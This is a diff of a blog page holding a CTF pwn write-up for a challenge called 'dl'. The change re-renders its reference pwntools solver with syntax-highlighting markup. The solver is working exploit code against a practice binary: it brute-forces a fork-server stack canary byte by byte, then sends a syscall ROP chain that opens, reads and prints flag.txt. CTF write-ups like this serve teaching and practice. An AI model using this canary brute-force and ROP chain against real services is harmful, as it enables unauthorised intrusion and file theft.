@@ -1,17 +1,17 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#0b0b0e"><title>dl · Pwn writeup — r3t0x</title><meta name="description" content="A dynamic loader exploitation challenge. Abuse the linker's resolution mechanism to hijack control flow and redirect execution to your…"><link rel="canonical" href="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/dl/"><meta property="og:type" content="article"><meta property="og:title" content="dl · Pwn writeup — r3t0x"><meta property="og:description" content="A dynamic loader exploitation challenge. Abuse the linker's resolution mechanism to hijack control flow and redirect execution to your…"><meta property="og:url" content="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/dl/"><meta property="og:image" content="https://ghaith-amdouni.github.io/static/img/social-card.png"><meta name="twitter:card" content="summary_large_image"><link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="r3t0x journal" href="/feed.xml"><link rel="stylesheet" href="/static/css/site.css?v=c3965b3600e8"><link rel="stylesheet" href="/static/css/akatsuki.css?v=c3965b3600e8"><script src="/static/js/site.js?v=c3965b3600e8" defer></script></head><body class="veil-open">
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#0b0b0e"><title>dl · Pwn writeup — r3t0x</title><meta name="description" content="A dynamic loader exploitation challenge. Abuse the linker's resolution mechanism to hijack control flow and redirect execution to your…"><link rel="canonical" href="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/dl/"><meta property="og:type" content="article"><meta property="og:title" content="dl · Pwn writeup — r3t0x"><meta property="og:description" content="A dynamic loader exploitation challenge. Abuse the linker's resolution mechanism to hijack control flow and redirect execution to your…"><meta property="og:url" content="https://ghaith-amdouni.github.io/challenge/mojo-jojo/pwn/dl/"><meta property="og:image" content="https://ghaith-amdouni.github.io/static/img/social-card.png"><meta name="twitter:card" content="summary_large_image"><link rel="icon" href="/static/img/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="r3t0x journal" href="/feed.xml"><link rel="stylesheet" href="/static/css/site.css?v=b0b7e08b9fc0"><link rel="stylesheet" href="/static/css/akatsuki.css?v=b0b7e08b9fc0"><script src="/static/js/site.js?v=b0b7e08b9fc0" defer></script></head><body class="veil-open">
   <a class="skip" href="#main">Skip to content</a><div class="reading-progress" aria-hidden="true"></div>
   <div class="systembar"><div><span class="arch-mini" aria-hidden="true">Λ</span> archlinux <span class="bar-sep">/</span> r3t0x@portfolio <span class="system-workspaces" aria-hidden="true"><b>01</b> 02 03</span></div><div><span class="online-dot"></span> ALL SYSTEMS NOMINAL <span class="bar-sep">/</span> <time id="clock">UTC</time></div></div>
   <header class="site-header"><a class="brand" href="/" aria-label="r3t0x home"><img class="brand-eye" src="/static/img/mangekyou.png" alt="" width="32" height="32"><span>r3t0x<span class="muted">@arch</span></span></a><nav aria-label="Main navigation"><a href="/" >~/home</a><a href="/blog/" aria-current="page">~/archive</a><a href="/projects/" >~/projects</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>CV ↓</a></nav><button class="search-trigger" data-open-search aria-label="Search site"><span>⌕</span><kbd>Ctrl K</kbd></button></header>
   <div class="archive-transition" id="archive-transition" aria-hidden="true"><div class="route-eyelid route-eyelid-top"></div><div class="route-eyelid route-eyelid-bottom"></div><div class="vault-coordinates"><span>00:00:01</span><span>0x00401337</span></div><div class="vault-eye"><span class="vault-symbol"></span><span class="vault-reticle"></span><i></i><i></i><i></i></div><div class="vault-caption"><p><small>TSUKUYOMI ROUTE SHIFT</small><b id="transition-label">ENTERING THE MEMORY VAULT</b><span id="transition-address">~/archive</span></p></div></div>
   <div class="ambient-clouds" aria-hidden="true"><svg class="akatsuki-cloud" viewBox="0 0 160 100" aria-hidden="true"><path d="M34 78C9 80 6 52 28 47C20 24 47 13 63 28C75 3 112 12 113 37C138 27 158 51 143 69C135 79 119 80 108 76C104 91 81 91 73 79C62 89 42 91 34 78Z"/><path class="cloud-whorl" d="M28 47C52 41 68 52 62 65C57 76 39 72 41 62M113 37C93 36 85 47 90 59"/></svg><svg class="akatsuki-cloud" viewBox="0 0 160 100" aria-hidden="true"><path d="M34 78C9 80 6 52 28 47C20 24 47 13 63 28C75 3 112 12 113 37C138 27 158 51 143 69C135 79 119 80 108 76C104 91 81 91 73 79C62 89 42 91 34 78Z"/><path class="cloud-whorl" d="M28 47C52 41 68 52 62 65C57 76 39 72 41 62M113 37C93 36 85 47 90 59"/></svg></div><div class="scroll-address" aria-hidden="true"><b>RIP</b><span id="scroll-address">0x00000000</span><i><em></em></i><small>PTR</small></div><div class="route-veil" id="route-veil" aria-hidden="true"><div class="veil-lid veil-lid-top"></div><div class="veil-lid veil-lid-bottom"></div><div class="veil-eye"><svg viewBox="0 0 200 200"><defs><clipPath id="veilClip"><circle cx="100" cy="100" r="98"/></clipPath></defs><circle cx="100" cy="100" r="94" fill="var(--red)" stroke="#000" stroke-width="10"/><g class="veil-base"><circle cx="100" cy="100" r="90" fill="var(--red)"/><circle cx="100" cy="100" r="16" fill="#000"/><circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/><g class="veil-tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g><g class="veil-tomoe" style="transform:rotate(120deg)"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g><g class="veil-tomoe" style="transform:rotate(240deg)"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g></g><image class="veil-mangekyo" href="/static/img/mangekyou.png" x="0" y="0" width="200" height="200" clip-path="url(#veilClip)"/></svg></div></div><div class="kamui-veil" id="kamui-veil" aria-hidden="true"></div><main id="main"><article class="wrap article-page writeup-page">
-    <a class="text-link" href="/blog/?collection=MOJO-JOJO%20CTF">← Back to the archive</a>
+    <a class="text-link" href="/blog/?collection=MOJO-JOJO+CTF&amp;category=Pwn">← Back to archive · Pwn</a>
     <header class="article-heading"><p class="eyebrow">MOJO-JOJO CTF <span>/</span> Pwn WRITEUP</p><h1>dl</h1><p>A dynamic loader exploitation challenge. Abuse the linker's resolution mechanism to hijack control flow and redirect execution to your…</p>
       <div class="article-author"><img src="/static/img/ghaith.webp" alt="" width="44" height="44"><span><strong>r3t0x</strong><small>2026-09-28 · archived challenge · medium</small></span><a class="button" href="#solver">Jump to solver ↓</a></div>
     </header>
     <div class="writeup-facts" aria-label="Challenge metadata"><span><small>EVENT</small>MOJO-JOJO CTF</span><span><small>CATEGORY</small>Pwn</span><span><small>DIFFICULTY</small>medium</span><span><small>POINTS</small>Archived</span></div>
     <div class="writeup-tags"><span>Blind ROP + Seccomp ORW</span></div>
     <div class="article-layout">
-      <div class="prose writeup-prose"><h2 id="summary">Summary</h2><p class="lead">A dynamic loader exploitation challenge. Abuse the linker's resolution mechanism to hijack control flow and redirect execution to your…</p><h2 id="walkthrough">Walkthrough</h2><h3>Reconnaissance</h3>
+      <div class="prose writeup-prose"><h2 id="walkthrough">Walkthrough</h2><h3>Reconnaissance</h3>
 <div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./absolute_zero
 <span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
 <span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
@@ -45,142 +45,142 @@
 <h3>Result</h3>
 <div class="codehilite"><pre><span></span><code>[*] ROP chain size: 248 bytes
 flag{4bs0lut3_z3r0_bl1nd_rop}
-</code></pre></div><h2 id="solver">Reference solver</h2><p>The complete solver used to validate the challenge:</p><pre><code class="language-python">from pwn import *
+</code></pre></div><h2 id="solver">Reference solver</h2><p>The reference solver supplied with the writeup:</p><pre><code class="language-python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 
-binary_path = args.EXE if args.EXE else './absolute_zero_docker'
+binary_path = args.EXE <span class="hljs-keyword">if</span> args.EXE <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;./absolute_zero_docker&#x27;</span>
 context.binary = elf = ELF(binary_path)
 
-def start():
-    return process(binary_path)
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():
+    <span class="hljs-keyword">return</span> process(binary_path)
 
-# Canary Brute-Force Logic for Fork-Server
-def brute_force_canary():
-    known_canary = b'\x00'
-    log.info(&quot;Brute-forcing canary byte-by-byte...&quot;)
+<span class="hljs-comment"># Canary Brute-Force Logic for Fork-Server</span>
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force_canary</span>():
+    known_canary = <span class="hljs-string">b&#x27;\x00&#x27;</span>
+    log.info(<span class="hljs-string">&quot;Brute-forcing canary byte-by-byte...&quot;</span>)
 
-    # Canary is 8 bytes. First byte is always NULL.
-    # We need to find the remaining 7 bytes.
-    for i in range(7):
-        found_byte = False
-        bar = log.progress(f&quot;Byte {i+2}&quot;)
-        for b in range(256):
-            # Optimization: Try common values first? No, random.
-            candidate = bytes([b])
-            payload = b&quot;A&quot;*72 + known_canary + candidate
+    <span class="hljs-comment"># Canary is 8 bytes. First byte is always NULL.</span>
+    <span class="hljs-comment"># We need to find the remaining 7 bytes.</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
+        found_byte = <span class="hljs-literal">False</span>
+        bar = log.progress(<span class="hljs-string">f&quot;Byte <span class="hljs-subst">{i+<span class="hljs-number">2</span>}</span>&quot;</span>)
+        <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
+            <span class="hljs-comment"># Optimization: Try common values first? No, random.</span>
+            candidate = <span class="hljs-built_in">bytes</span>([b])
+            payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">72</span> + known_canary + candidate
 
-            try:
-                # We connect to localhost:1337 (or args.PORT)
-                target_port = int(args.PORT) if args.PORT else 9010
-                r = remote(&quot;localhost&quot;, target_port, level='error')
+            <span class="hljs-keyword">try</span>:
+                <span class="hljs-comment"># We connect to localhost:1337 (or args.PORT)</span>
+                target_port = <span class="hljs-built_in">int</span>(args.PORT) <span class="hljs-keyword">if</span> args.PORT <span class="hljs-keyword">else</span> <span class="hljs-number">9010</span>
+                r = remote(<span class="hljs-string">&quot;localhost&quot;</span>, target_port, level=<span class="hljs-string">&#x27;error&#x27;</span>)
                 r.send(payload)
 
-                # Check if it crashed.
-                # If we send 73 bytes (overwrite 1 byte of canary), and it's WRONG,
-                # stack check fails -&gt; SIGABRT/SIGSEGV -&gt; Connection closes immediately?
-                # Or it prints something?
-                # Our invalid canary causes __stack_chk_fail -&gt; which calls exit/abort.
-                # If correct, it returns from process_input -&gt; returns from challenge -&gt; returns from handle_client -&gt; exit(0).
+                <span class="hljs-comment"># Check if it crashed.</span>
+                <span class="hljs-comment"># If we send 73 bytes (overwrite 1 byte of canary), and it&#x27;s WRONG,</span>
+                <span class="hljs-comment"># stack check fails -&gt; SIGABRT/SIGSEGV -&gt; Connection closes immediately?</span>
+                <span class="hljs-comment"># Or it prints something?</span>
+                <span class="hljs-comment"># Our invalid canary causes __stack_chk_fail -&gt; which calls exit/abort.</span>
+                <span class="hljs-comment"># If correct, it returns from process_input -&gt; returns from challenge -&gt; returns from handle_client -&gt; exit(0).</span>
 
-                # How to distinguish?
-                # __stack_chk_fail usually prints to stderr: &quot;*** stack smashing detected ***: terminated&quot;
-                # IF we can read stderr, we know it failed.
-                # But over netcat, do we see stderr?
-                # dup2(sock, 2) inside server.c means YES, we see stderr.
+                <span class="hljs-comment"># How to distinguish?</span>
+                <span class="hljs-comment"># __stack_chk_fail usually prints to stderr: &quot;*** stack smashing detected ***: terminated&quot;</span>
+                <span class="hljs-comment"># IF we can read stderr, we know it failed.</span>
+                <span class="hljs-comment"># But over netcat, do we see stderr?</span>
+                <span class="hljs-comment"># dup2(sock, 2) inside server.c means YES, we see stderr.</span>
 
-                response = r.recvall(timeout=0.1)
+                response = r.recvall(timeout=<span class="hljs-number">0.1</span>)
                 r.close()
 
-                if b&quot;Done&quot; in response:
-                    # Success message -&gt; Correct byte!
+                <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Done&quot;</span> <span class="hljs-keyword">in</span> response:
+                    <span class="hljs-comment"># Success message -&gt; Correct byte!</span>
                     known_canary += candidate
-                    bar.success(f&quot;Found: {hex(b)}&quot;)
-                    found_byte = True
-                    break
-            except Exception as e:
-                # log.error(f&quot;Error: {e}&quot;)
-                pass
+                    bar.success(<span class="hljs-string">f&quot;Found: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(b)}</span>&quot;</span>)
+                    found_byte = <span class="hljs-literal">True</span>
+                    <span class="hljs-keyword">break</span>
+            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+                <span class="hljs-comment"># log.error(f&quot;Error: {e}&quot;)</span>
+                <span class="hljs-keyword">pass</span>
 
-        if not found_byte:
-            log.error(&quot;Failed to find canary byte. Is the server running?&quot;)
-            exit(1)
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> found_byte:
+            log.error(<span class="hljs-string">&quot;Failed to find canary byte. Is the server running?&quot;</span>)
+            exit(<span class="hljs-number">1</span>)
 
-    log.success(f&quot;Brute-forced Canary: {hex(u64(known_canary))}&quot;)
-    return u64(known_canary)
+    log.success(<span class="hljs-string">f&quot;Brute-forced Canary: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(u64(known_canary))}</span>&quot;</span>)
+    <span class="hljs-keyword">return</span> u64(known_canary)
 
-# Connect to target
-if args.REMOTE:
-    io = remote(args.HOST, int(args.PORT))
-else:
-    # Local verification mode: we must assume server is running
-    io = remote(&quot;localhost&quot;, 1337)
+<span class="hljs-comment"># Connect to target</span>
+<span class="hljs-keyword">if</span> args.REMOTE:
+    io = remote(args.HOST, <span class="hljs-built_in">int</span>(args.PORT))
+<span class="hljs-keyword">else</span>:
+    <span class="hljs-comment"># Local verification mode: we must assume server is running</span>
+    io = remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>)
 
-# FOR TESTING: If we are not running the brute force every time (slow),
-# we can hardcode it if we know it (impossible if random startup).
-# But for the purpose of &quot;ensure it works&quot;, we run it.
+<span class="hljs-comment"># FOR TESTING: If we are not running the brute force every time (slow),</span>
+<span class="hljs-comment"># we can hardcode it if we know it (impossible if random startup).</span>
+<span class="hljs-comment"># But for the purpose of &quot;ensure it works&quot;, we run it.</span>
 canary = brute_force_canary()
 
-# ROP Chain using direct syscalls
+<span class="hljs-comment"># ROP Chain using direct syscalls</span>
 rop = ROP(elf)
 
-# 1. Setup Data Area
-# We place our string &quot;flag.txt&quot; in BSS.
-data_start = elf.bss() + 0x100
-log.info(f&quot;data_start: {hex(data_start)}&quot;)
+<span class="hljs-comment"># 1. Setup Data Area</span>
+<span class="hljs-comment"># We place our string &quot;flag.txt&quot; in BSS.</span>
+data_start = elf.bss() + <span class="hljs-number">0x100</span>
+log.info(<span class="hljs-string">f&quot;data_start: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(data_start)}</span>&quot;</span>)
 
-# 0. read(0, data_start, 500) (Load &quot;flag.txt&quot;)
-rop.rax = 0
-rop.rdi = 0
+<span class="hljs-comment"># 0. read(0, data_start, 500) (Load &quot;flag.txt&quot;)</span>
+rop.rax = <span class="hljs-number">0</span>
+rop.rdi = <span class="hljs-number">0</span>
 rop.rsi = data_start
-rop.rdx = 500
-rop.raw(rop.find_gadget(['syscall', 'ret'])[0])
+rop.rdx = <span class="hljs-number">500</span>
+rop.raw(rop.find_gadget([<span class="hljs-string">&#x27;syscall&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>])
 
-# openat(AT_FDCWD, &quot;flag.txt&quot;, 0)
-# rax = 257 (sys_openat)
-# rdi = -100
-# rsi = data_start
-# rdx = 0
-rop.rax = 257
-rop.rdi = -100
+<span class="hljs-comment"># openat(AT_FDCWD, &quot;flag.txt&quot;, 0)</span>
+<span class="hljs-comment"># rax = 257 (sys_openat)</span>
+<span class="hljs-comment"># rdi = -100</span>
+<span class="hljs-comment"># rsi = data_start</span>
+<span class="hljs-comment"># rdx = 0</span>
+rop.rax = <span class="hljs-number">257</span>
+rop.rdi = -<span class="hljs-number">100</span>
 rop.rsi = data_start
-rop.rdx = 0
-rop.raw(rop.find_gadget(['syscall', 'ret'])[0])
+rop.rdx = <span class="hljs-number">0</span>
+rop.raw(rop.find_gadget([<span class="hljs-string">&#x27;syscall&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>])
 
-# read(3, bss, 100)
-# rax = 0
-# rdi = 3
-# rsi = data_start + 0x500
-# rdx = 100
-rop.rax = 0
-rop.rdi = 3
-rop.rsi = data_start + 0x500
-rop.rdx = 100
-rop.raw(rop.find_gadget(['syscall', 'ret'])[0])
+<span class="hljs-comment"># read(3, bss, 100)</span>
+<span class="hljs-comment"># rax = 0</span>
+<span class="hljs-comment"># rdi = 3</span>
+<span class="hljs-comment"># rsi = data_start + 0x500</span>
+<span class="hljs-comment"># rdx = 100</span>
+rop.rax = <span class="hljs-number">0</span>
+rop.rdi = <span class="hljs-number">3</span>
+rop.rsi = data_start + <span class="hljs-number">0x500</span>
+rop.rdx = <span class="hljs-number">100</span>
+rop.raw(rop.find_gadget([<span class="hljs-string">&#x27;syscall&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>])
 
-# write(1, bss, 100)
-# rax = 1
-# rdi = 1
-# rsi = data_start + 0x500
-# rdx = 100
-rop.rax = 1
-rop.rdi = 1
-rop.rsi = data_start + 0x500
-rop.rdx = 100
-rop.raw(rop.find_gadget(['syscall', 'ret'])[0])
+<span class="hljs-comment"># write(1, bss, 100)</span>
+<span class="hljs-comment"># rax = 1</span>
+<span class="hljs-comment"># rdi = 1</span>
+<span class="hljs-comment"># rsi = data_start + 0x500</span>
+<span class="hljs-comment"># rdx = 100</span>
+rop.rax = <span class="hljs-number">1</span>
+rop.rdi = <span class="hljs-number">1</span>
+rop.rsi = data_start + <span class="hljs-number">0x500</span>
+rop.rdx = <span class="hljs-number">100</span>
+rop.raw(rop.find_gadget([<span class="hljs-string">&#x27;syscall&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])[<span class="hljs-number">0</span>])
 
-print(rop.dump())
+<span class="hljs-built_in">print</span>(rop.dump())
 
-payload = b&quot;A&quot; * 72
+payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">72</span>
 payload += p64(canary)
-payload += b&quot;B&quot; * 8
+payload += <span class="hljs-string">b&quot;B&quot;</span> * <span class="hljs-number">8</span>
 payload += rop.chain()
 
 io.sendline(payload)
-sleep(0.5)
-# Send &quot;flag.txt&quot;
-io.send(b&quot;flag.txt\x00&quot; + b&quot;\x00&quot;*100)
+sleep(<span class="hljs-number">0.5</span>)
+<span class="hljs-comment"># Send &quot;flag.txt&quot;</span>
+io.send(<span class="hljs-string">b&quot;flag.txt\x00&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">100</span>)
 
-print(io.recvall(timeout=2))</code></pre><h2 id="flag">Flag</h2><pre class="flag-output"><code>flag{4bs0lut3_z3r0_bl1nd_rop}</code></pre>
-      <div class="article-end"><span>Published 2026-09-28 · by r3t0x</span><a class="text-link" href="/blog/?collection=MOJO-JOJO%20CTF">More MOJO-JOJO CTF writeups ↗</a></div></div>
+<span class="hljs-built_in">print</span>(io.recvall(timeout=<span class="hljs-number">2</span>))</code></pre><h2 id="flag">Flag</h2><pre class="flag-output"><code>flag{4bs0lut3_z3r0_bl1nd_rop}</code></pre>
+      <div class="article-end"><span>Published 2026-09-28 · by r3t0x</span><a class="text-link" href="/blog/?collection=MOJO-JOJO+CTF&amp;category=Pwn">← Back to archive · Pwn</a></div></div>
     </div>
   </article></main>
   <footer class="site-footer"><div class="footer-top"><a class="brand" href="/"><img class="brand-eye" src="/static/img/mangekyou.png" alt="" width="32" height="32"><span>r3t0x<span class="muted">@arch</span></span></a><p>Always curious. Always one layer deeper.</p><a href="#main" class="text-link">Back to top ↑</a></div><div class="footer-bottom"><span>© 2026 Ghaith Amdouni <span class="red">·</span> Made with curiosity & caffeine.</span><div><a href="/projects/">Projects ↗</a><a href="https://github.com/Ghaith-amdouni">GitHub ↗</a><a href="https://www.linkedin.com/in/amdouni-ghaith">LinkedIn ↗</a><a href="/static/docs/Ghaith-Amdouni-CV-English.pdf" download>Résumé ↗</a><a href="/feed.xml">RSS ↗</a><button id="motion-toggle" aria-pressed="false">Motion: on</button></div></div></footer>
